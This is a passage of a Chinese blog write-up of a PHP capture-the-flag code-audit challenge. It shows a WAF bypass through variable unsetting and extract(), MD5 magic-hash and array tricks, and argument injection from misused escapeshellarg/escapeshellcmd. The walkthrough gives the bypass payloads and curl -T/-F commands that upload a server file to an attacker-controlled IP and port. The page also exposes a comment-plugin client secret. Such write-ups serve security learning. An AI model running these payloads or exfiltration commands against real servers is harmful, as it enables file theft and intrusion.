+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123; &#x2F;&#x2F;不能存在为flag的键名</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP); &#x2F;&#x2F;将键值 赋值给变量 键名为变量名的变量</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);  &#x2F;&#x2F;EXTR_SKIP - 如果有冲突，不覆盖已有的变量</span><br><span class="line">if(isset($_GET[&#39;flag&#39;]))&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;</span><br><span class="line">        exit(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123; &#x2F;&#x2F;和上面的if可以用数组绕过</span><br><span class="line">        $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">        $urlInfo &#x3D; parse_url($url);</span><br><span class="line">        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;</span><br><span class="line">            die( &quot;scheme error!&quot;);&#x2F;&#x2F;url的值要以http开头</span><br><span class="line">        &#125;</span><br><span class="line">        $url &#x3D; escapeshellarg($url);</span><br><span class="line">        $url &#x3D; escapeshellcmd($url);&#x2F;&#x2F;就按我们上面说的漏洞一样绕过</span><br><span class="line">        system(&quot;curl &quot;.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;HRCTF&#123;Are_y0u_maz1ng&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CTF-题解"><a href="#CTF-题解" class="headerlink" title="CTF 题解"></a>CTF 题解</h3><h4 id="POST以-GET-flag-会以什么样的形式存储-？"><a href="#POST以-GET-flag-会以什么样的形式存储-？" class="headerlink" title="POST以_GET[flag]会以什么样的形式存储 ？"></a>POST以_GET[flag]会以什么样的形式存储 ？</h4><p>测试代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_POST);</span><br><span class="line">echo &quot;\n\n\n\n&quot;;</span><br><span class="line">var_dump($_GET);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload: flag&#x3D;1&amp;a[1]&#x3D;1&amp;a[2]&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;flag&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [&quot;a&quot;]&#x3D;&gt;</span><br><span class="line">  array(2) &#123;</span><br><span class="line">    [1]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;1&quot;</span><br><span class="line">    [2]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;2&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;flag&quot;]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [&quot;a&quot;]&#x3D;&gt;</span><br><span class="line">  array(2) &#123;</span><br><span class="line">    [1]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;1&quot;</span><br><span class="line">    [2]&#x3D;&gt;</span><br><span class="line">    string(1) &quot;2&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也就是说，get和post都一样，但我们传入单独的一个键值对时就会被当成一个普通键值对。<br>但当我们传入一个数组时会被内嵌套为一个数组。（其实也好理解，只是我思维一下没转过来）。就是get、post也可以传一个数组的。</p>
+<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><ol>
+<li>我们先来看看这里：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+&emsp;看了我好一会啊，第一个foreach 首先将 <code>_POST</code> 给 <code>$__R</code> ，然后进行判断相当于判断 <code>if($_POST)</code> 也就是是否传了POST值。随后第二个 foreach 将我们的POST的数据，键赋值给<code>$__k</code>值赋值给<code>$__v</code>。接着进行判断，如果键等于值就进行unset销毁以键名为变量名的变量。<br>&emsp;假如我们通过GET提交flag=mayi，接着通过POST提交一个_GET[flag]=mayi。<br>&emsp;分析运行过程：首先遍历POST请求，第二个foreach时 <code>$__k=_GET</code> 所以<code>$$__K</code>就相当于<code>$_GET</code>而我们也传了$_GET且值就为<code>$__v</code>的值（数组 flag=mayi），所以就将<code>$_GET</code>进行销毁。<br>&emsp;然后运行到 waf($_POST); 此时，进行判断时 <code>$key</code> 的值为 _GET (_GET下的flag键不会被检测到)。当然不会触发 die。<br>&emsp;再看看此时的 <code>if($_GET)</code> 我们的<code>$_GET</code> 已经被销毁了，waf（）当然不会被执行了。至于<code>if($_COOKIE)</code> 我们根本就没设置flag键就更不会被触发了。<br>&emsp;再运行到这里 <code>extract($_POST, EXTR_SKIP);</code> 会将我们的<code>$_GET</code> 赋值为数组flag=mayi也就是<code>$_GET[flag]=mayi</code>  然后再经过 <code>extract($_GET, EXTR_SKIP);</code> 就可以将 flag 赋值为 mayi 了。至于<code>EXTR_SKIP</code>就是已经存在的变量不覆盖。 （这样我们就绕过waf了）<br>&emsp;然后还有一个md5需要绕过，我们有2个办法。第一选着2个0e开头的md5即可绕过。第二就是传入数组。第二种需要注意：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get： flag[]&#x3D;1</span><br><span class="line">我们需要：</span><br><span class="line">post: _GET[flag][]&#x3D;1 表示二维数组</span><br><span class="line">而不是——GET[flag[]]错误写法</span><br><span class="line"></span><br><span class="line">md5值0e开头的2个字符串：</span><br><span class="line">QNKCDZO和s878926199a</span><br></pre></td></tr></table></figure>
+所以到这里我们绕过的payload为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  flag&#x3D;s878926199a&amp;hongri&#x3D;QNKCDZO</span><br><span class="line">post: _GET[flag]&#x3D;s878926199a&amp;_GET[hongri]&#x3D;QNKCDZO</span><br></pre></td></tr></table></figure>
+记住，get发的请求在post也要以_GET方式发送一份。</li>
+</ol>
+<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>我们需要用http开头我们的url。<br>第一，我们使用 -T 或者 -F 参数上传flag文件到 vps指定端口，并且vps nc监听端口。<br>第二种，我们 使用 -T  -T 可以上传文件给一个不存在的http开头的网址，然后-x来设置代理为vps及指定端口，并在vps中进行监听。</p>
+<h5 id="window问题"><a href="#window问题" class="headerlink" title="window问题"></a>window问题</h5><p>&emsp;Linux环境中在以下字符之前插入： #&amp;;`|<em>?~&lt;&gt;^()[]{}$, x0A 和 xFF。 ‘ 和 “  仅在不配对的时候被反斜杠转义。<br>&emsp;*</em>windows中**所有以上的符号包括 ‘ 和 “ 都会被前缀 ^ 来转义的。<br>&emsp;这就很烦呀，我们本来可以通过 http：/vps:端口 然后直接侦听到flag。但是发送如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;http:&#x2F;&#x2F;47.115.150.207:666 -T d:&#x2F;&#x2F;test.txt&quot;</span><br><span class="line">^&quot;http:&#x2F;&#x2F;47.115.150.207:666 -T d:&#x2F;&#x2F;test.txt^&quot;</span><br><span class="line">这就导致我们出错了，所以应该在Windows下无法完成吧？</span><br></pre></td></tr></table></figure>
+
+<h5 id="直接测试发现"><a href="#直接测试发现" class="headerlink" title="直接测试发现"></a>直接测试发现</h5><p>我直接用cmd执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">###file&#x3D; 后不加@ 代理不会显示内容，而是显示d:&#x2F;&#x2F;test.txt</span><br><span class="line">curl http:&#x2F;&#x2F;47.115.sf.s&#39; -F file&#x3D;d:&#x2F;&#x2F;test.txt -x 47.115.150.207:666</span><br><span class="line">### 以下可以达到我们的效果</span><br><span class="line">curl http:&#x2F;&#x2F;47.115.sf.s&#39; -F file&#x3D;@d:&#x2F;&#x2F;test.txt -x 47.115.150.207:666</span><br><span class="line">curl http:&#x2F;&#x2F;47.115.sf.s&#39; -T d:&#x2F;&#x2F;test.txt -x 47.115.150.207:666</span><br><span class="line">### 但然其实我们不用代理直接肝也是可以的</span><br><span class="line">curl http:&#x2F;&#x2F;47.115.150.207:666 -T d:&#x2F;&#x2F;test.txt</span><br><span class="line">curl  -F file&#x3D;@d:&#x2F;&#x2F;test.txt  47.115.150.207:666</span><br></pre></td></tr></table></figure>
+<p>这次代码审计居然花了这么长时间，可能还是太菜了吧，再次被自己菜哭。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/04/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/" title="代码审计 -- escapeshellarg与escapeshellcmd使用不当">https://mayi077.github.io/2020/04/29/代码审计-escapeshellarg与escapeshellcmd使用不当/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i>代码审计</a>
+              <a href="/tags/escapeshellcmd/" rel="tag"><i class="fa fa-tag"></i>escapeshellcmd</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-strpos%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E5%BC%95%E5%8F%91%E6%BC%8F%E6%B4%9E/" rel="prev" title="代码审计 -- strpos使用不当引发漏洞">
+      <i class="fa fa-chevron-left"></i> 代码审计 -- strpos使用不当引发漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/30/Win10-%E5%AE%89%E8%A3%85%E5%AD%90%E7%B3%BB%E7%BB%9F-Ubuntu-%E5%88%B0-D-%E7%9B%98/" rel="next" title="Win10 安装子系统 Ubuntu 到 D 盘">
+      Win10 安装子系统 Ubuntu 到 D 盘 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#源码"><span class="nav-number">1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#内置-mail-函数"><span class="nav-number">2.1.</span> <span class="nav-text">内置 mail 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#filter-var-函数"><span class="nav-number">2.2.</span> <span class="nav-text">filter_var 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#escapeshellarg-函数"><span class="nav-number">2.3.</span> <span class="nav-text">escapeshellarg() 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#escapeshellcmd-函数"><span class="nav-number">2.4.</span> <span class="nav-text">escapeshellcmd() 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#再来看题目了"><span class="nav-number">2.5.</span> <span class="nav-text">再来看题目了</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-题目"><span class="nav-number">3.</span> <span class="nav-text">CTF 题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-题解"><span class="nav-number">4.</span> <span class="nav-text">CTF 题解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#POST以-GET-flag-会以什么样的形式存储-？"><span class="nav-number">4.1.</span> <span class="nav-text">POST以_GET[flag]会以什么样的形式存储 ？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第一部分"><span class="nav-number">4.2.</span> <span class="nav-text">第一部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二部分"><span class="nav-number">4.3.</span> <span class="nav-text">第二部分</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#window问题"><span class="nav-number">4.3.1.</span> <span class="nav-text">window问题</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#直接测试发现"><span class="nav-number">4.3.2.</span> <span class="nav-text">直接测试发现</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : '2b3c6273fa5911d9b577d21244a4de5f',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
